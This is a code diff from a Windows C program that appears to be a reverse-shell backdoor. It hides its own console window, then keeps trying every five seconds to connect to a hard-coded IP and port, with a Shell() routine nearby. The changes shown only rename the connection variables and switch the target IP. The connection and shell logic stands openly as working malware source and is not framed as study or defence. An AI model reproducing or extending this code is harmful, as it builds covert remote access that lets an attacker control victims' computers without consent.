@@ -279,7 +279,7 @@ void Shell()
 }
 
 // Function to establish the connection
-int EstablishConnection(const char *ServIp, unsigned short ServPort)
+int EstablishConnection(const char *ServerIp, unsigned short ServerPort)
 {
   struct sockaddr_in ServAddr;
 
@@ -298,8 +298,8 @@ int EstablishConnection(const char *ServIp, unsigned short ServPort)
 
   // Reset config
   ServAddr.sin_family = AF_INET;
-  ServAddr.sin_addr.S_un.S_addr = inet_addr(ServIp);
-  ServAddr.sin_port = htons(ServPort);
+  ServAddr.sin_addr.S_un.S_addr = inet_addr(ServerIp);
+  ServAddr.sin_port = htons(ServerPort);
 
   // Connect every 5 seconds
   while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
@@ -325,8 +325,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
   ShowWindow(stealth, 0);
 
   // Define variables
-  char *ServIp = "192.168.1.21";
-  unsigned short ServPort = 6709;
+  char *ServerIp = "192.168.1.65";
+  unsigned short ServerPort = 6709;
 
   // Check if WinSock is ready
   WSADATA wsaData;
@@ -337,7 +337,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
   }
 
   // Establish connection
-  if (EstablishConnection(ServIp, ServPort) != 0)
+  if (EstablishConnection(ServerIp, ServerPort) != 0)
   {
     // Handle connection failure
     // error("Coudln't establish connection.");
@@ -351,4 +351,4 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
   closesocket(sock);
 
   return 0;
-}
+};
